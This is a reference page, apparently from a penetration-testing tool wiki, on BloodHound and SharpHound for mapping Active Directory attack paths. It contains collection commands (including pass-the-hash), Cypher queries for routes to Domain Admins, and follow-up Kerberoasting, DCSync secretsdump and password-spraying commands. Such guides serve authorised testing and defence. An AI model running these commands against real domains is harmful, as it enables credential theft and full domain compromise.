---
id: "bloodhound"
title: "BloodHound - Active Directory Attack Path Visualization"
type: "tool"
category: "network"
subcategory: "active-directory"
tags: ["ad", "bloodhound", "sharphound", "active-directory", "domain-admin", "attack-path", "privilege-escalation", "lateral-movement"]
difficulty: "intermediate"
platforms: ["linux", "macos", "windows"]
source_url: "https://github.com/SpecterOps/BloodHound"
related: ["impacket", "netexec"]
updated: "2026-04-14"
---

## Overview

BloodHound maps Active Directory as a graph database, visualizing attack paths from any compromised user to high-value targets like Domain Admins. Uses SharpHound to collect AD data (users, computers, groups, sessions, ACLs, trusts) and Neo4j for graph analysis. Finds multi-hop privilege escalation chains that humans would never trace manually.

## Architecture

- **SharpHound**: C# data collector, runs on domain-joined Windows machine
- **BloodHound CE**: Community Edition web UI (replaced legacy Electron app)
- **Neo4j**: Graph database backend
- **Cypher**: Query language for graph traversal

## Installation

### BloodHound CE (Current Version)
```bash
# Docker Compose (recommended)
curl -L https://ghst.ly/getbhce -o docker-compose.yml
docker compose up -d

# Access at http://localhost:8080
# Default creds shown in docker logs
docker compose logs | grep "Initial Password"
```

### Legacy BloodHound
```bash
# Install Neo4j
sudo apt install neo4j
sudo neo4j start
# Set password at http://localhost:7474

# Install BloodHound
sudo apt install bloodhound
# Or download from GitHub releases
bloodhound --no-sandbox
```

## Data Collection with SharpHound

### SharpHound CE (Current)
```powershell
# Basic collection (all methods)
.\SharpHound.exe -c All

# Specific collection methods
.\SharpHound.exe -c DCOnly        # Domain controller only (LDAP)
.\SharpHound.exe -c Session       # Active sessions
.\SharpHound.exe -c ACL           # ACL data
.\SharpHound.exe -c LocalGroup    # Local group memberships
.\SharpHound.exe -c Trusts        # Domain trusts
.\SharpHound.exe -c ObjectProps   # Object properties
.\SharpHound.exe -c Default       # Default collection
.\SharpHound.exe -c All           # Everything

# Session loop (continuous collection)
.\SharpHound.exe -c Session --Loop --LoopDuration 02:00:00

# Specify domain
.\SharpHound.exe -c All -d target.local

# Specify DC
.\SharpHound.exe -c All --DomainController dc01.target.local

# Stealth mode (fewer queries)
.\SharpHound.exe -c DCOnly --Stealth

# Output directory
.\SharpHound.exe -c All --OutputDirectory C:\temp\

# Exclude DCs from session enum
.\SharpHound.exe -c All --ExcludeDomainControllers

# With credentials
runas /netonly /user:DOMAIN\user "SharpHound.exe -c All"
```

### SharpHound PowerShell
```powershell
# Import module
Import-Module .\SharpHound.ps1

# Run collection
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
Invoke-BloodHound -CollectionMethod DCOnly -Stealth
```

### BloodHound.py (Linux - remote collection)
```bash
# Install
pip3 install bloodhound

# Collect from Linux
bloodhound-python -d target.local -u 'user' -p 'password' -ns 10.10.10.1 -c all
bloodhound-python -d target.local -u 'user' -p 'password' -dc dc01.target.local -c all

# With hash (pass-the-hash)
bloodhound-python -d target.local -u 'user' --hashes :NTLM_HASH -ns 10.10.10.1 -c all

# Collection methods: Default, Group, LocalAdmin, Session, Trusts, All, DCOnly
```

## Uploading Data

### BloodHound CE
1. Navigate to http://localhost:8080
2. Click "Upload Data" or drag-and-drop
3. Upload the SharpHound ZIP file
4. Wait for ingestion to complete

### Legacy BloodHound
1. Open BloodHound, connect to Neo4j
2. Click Upload icon (up arrow)
3. Select all JSON files from SharpHound output

## Built-in Queries

### Pre-built Analysis Queries
```
- Find all Domain Admins
- Find Shortest Paths to Domain Admins
- Find Principals with DCSync Rights
- Shortest Paths to Unconstrained Delegation Systems
- Shortest Paths from Kerberoastable Users
- Shortest Paths to Domain Admins from Kerberoastable Users
- Find Computers where Domain Users are Local Admin
- Find Computers with Unsupported Operating Systems
- Shortest Paths from Domain Users to High Value Targets
- Find AS-REP Roastable Users (DontReqPreAuth)
- List All Kerberoastable Accounts
- Shortest Paths to High Value Targets
```

## Custom Cypher Queries

### Finding Attack Paths
```cypher
# Shortest path from owned user to Domain Admins
MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}))
RETURN p

# All paths from a specific user to DA
MATCH p=allShortestPaths((u:User {name:"USER@TARGET.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}))
RETURN p

# Find users with path to DA
MATCH (u:User), (g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}),
p=shortestPath((u)-[*1..]->(g))
RETURN u.name, length(p)
ORDER BY length(p) ASC

# Shortest path from any computer to DA
MATCH (c:Computer), (g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}),
p=shortestPath((c)-[*1..]->(g))
RETURN p
```

### Kerberos Attacks
```cypher
# AS-REP Roastable users
MATCH (u:User {dontreqpreauth:true})
RETURN u.name, u.description

# Kerberoastable users with admin rights
MATCH (u:User {hasspn:true})-[:AdminTo]->(c:Computer)
RETURN u.name, c.name

# Kerberoastable users with path to DA
MATCH (u:User {hasspn:true}), (g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"}),
p=shortestPath((u)-[*1..]->(g))
RETURN u.name, length(p)
```

### ACL Abuse
```cypher
# Users with GenericAll on other users
MATCH (u1:User)-[:GenericAll]->(u2:User)
RETURN u1.name, u2.name

# Users with WriteDacl on groups
MATCH (u:User)-[:WriteDacl]->(g:Group)
RETURN u.name, g.name

# Users who can DCSync
MATCH (u)-[:DCSync|GetChanges|GetChangesAll]->(d:Domain)
RETURN u.name

# ForceChangePassword relationships
MATCH (u1)-[:ForceChangePassword]->(u2:User)
RETURN u1.name, u2.name

# AddMember relationships
MATCH (u)-[:AddMember]->(g:Group)
RETURN u.name, g.name
```

### Session Analysis
```cypher
# Where do Domain Admins have sessions?
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"})
MATCH (c:Computer)-[:HasSession]->(u)
RETURN c.name, u.name

# Computers where unprivileged users have admin + DA sessions
MATCH (u1:User)-[:AdminTo]->(c:Computer)<-[:HasSession]-(u2:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@TARGET.LOCAL"})
WHERE NOT u1 = u2
RETURN c.name, u1.name AS local_admin, u2.name AS da_session
```

### Delegation
```cypher
# Unconstrained delegation computers
MATCH (c:Computer {unconstraineddelegation:true})
RETURN c.name

# Constrained delegation
MATCH (c:Computer)-[:AllowedToDelegate]->(t:Computer)
RETURN c.name, t.name
```

## Edge Types (Relationships)

| Edge | Description |
|------|-------------|
| MemberOf | Group membership |
| AdminTo | Local admin on computer |
| HasSession | Active session on computer |
| GenericAll | Full control over object |
| GenericWrite | Write access to object |
| WriteOwner | Can change object owner |
| WriteDacl | Can modify ACL |
| ForceChangePassword | Can reset password |
| AddMember | Can add to group |
| ReadLAPSPassword | Can read LAPS password |
| DCSync | Can perform DCSync |
| GetChanges / GetChangesAll | DCSync components |
| AllowedToDelegate | Constrained delegation |
| AllowedToAct | Resource-based constrained delegation |
| CanRDP | RDP access |
| CanPSRemote | PS Remoting access |
| SQLAdmin | SQL admin access |
| HasSIDHistory | SID History |
| Contains | OU/GPO containment |
| GPLink | GPO linked to OU |
| Owns | Object ownership |

## Integration with Other Tools

### With Impacket
```bash
# Kerberoast accounts found in BloodHound
GetUserSPNs.py domain/user:pass -dc-ip DC_IP -request

# AS-REP Roast accounts found in BloodHound
GetNPUsers.py domain/ -usersfile asrep_users.txt -dc-ip DC_IP

# DCSync after finding DCSync-capable account
secretsdump.py domain/user:pass@DC_IP
```

### With NetExec
```bash
# Validate admin access paths
nxc smb COMPUTER_IP -u user -p pass --local-auth

# Spray found credentials
nxc smb 10.10.10.0/24 -u user -p 'pass' --continue-on-success
```

### With Certipy (AD CS attacks)
```bash
# Find certificate template abuse paths
certipy find -u user@domain -p pass -dc-ip DC_IP
```

## Attack Path Workflow

1. **Collect**: Run SharpHound with `-c All` on domain-joined machine
2. **Upload**: Import ZIP into BloodHound CE
3. **Mark owned**: Right-click compromised user -> Mark as Owned
4. **Query**: Run "Shortest Paths from Owned Principals to Domain Admins"
5. **Analyze**: Examine each edge in the path for exploitability
6. **Execute**: Use appropriate tool (Impacket, NetExec, Rubeus) per edge type
7. **Repeat**: Mark newly compromised accounts as owned, re-query

## Pro Tips

- Run SharpHound with `--Loop` for Session collection to catch transient DA sessions
- Use `bloodhound-python` from Linux when you have creds but no domain-joined machine
- Mark every compromised account as "Owned" to find new paths
- Custom Cypher queries find attack paths the pre-built queries miss
- Check for LAPS passwords - ReadLAPSPassword is often overlooked
- Constrained delegation can lead to full domain compromise
- Look for "Shortest Paths from Domain Users" - paths available to ANY user
- GPO abuse edges can give you code execution on computers
- Session data is time-sensitive - collect multiple times
- DCOnly collection is stealthiest but misses session/local admin data
